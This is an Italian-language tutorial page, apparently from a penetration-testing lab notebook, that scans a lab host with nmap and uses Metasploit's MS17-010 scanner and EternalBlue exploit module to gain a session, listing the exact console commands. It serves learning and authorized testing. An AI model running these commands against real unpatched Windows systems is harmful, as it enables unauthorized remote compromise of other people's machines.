# Vulnerability Scanning With Metasploit

```
sudo nmap -sS -sV 10.10.10.7
searchsploit EternalBlue
searchsploit ms17-010
```

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nonostante SMB ci dica che è un PC tra Windows 7 e Windows 10, il nome host ci suggerisce che è Windows 7.

Quindi se è Windows 7 è vulnerabile a EternalBlue.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Andiamo a cercare se troviamo un exploit con (Metasploit), provando a cercare per il codice di Microsoft della vulnerabilità:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Troviamo i primi due: il primo è l'exploit module, il secondo è lo scanner module.

Ci sarebbe anche un nmap script che può fare questa verifica, ma qui ci concentriamo su MSF.

### Verificare una vulnerabilità con modulo MSF

```
msfconsole
search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS 10.10.10.7
run
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ci mostra la versione di Windows, l'architettura e il service pack.

### Exploitiamo la vulnerabilità con MSF

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.7
show options
exploit
sysinfo
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In questo caso il modulo prima verifica se è exploitabile con il modulo usato prima anche da noi:

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Eseguendo sysinfo verifichiamo che effettivamente le informazioni che ci aveva fornito lo scanner relative all'OS sono veritiere.
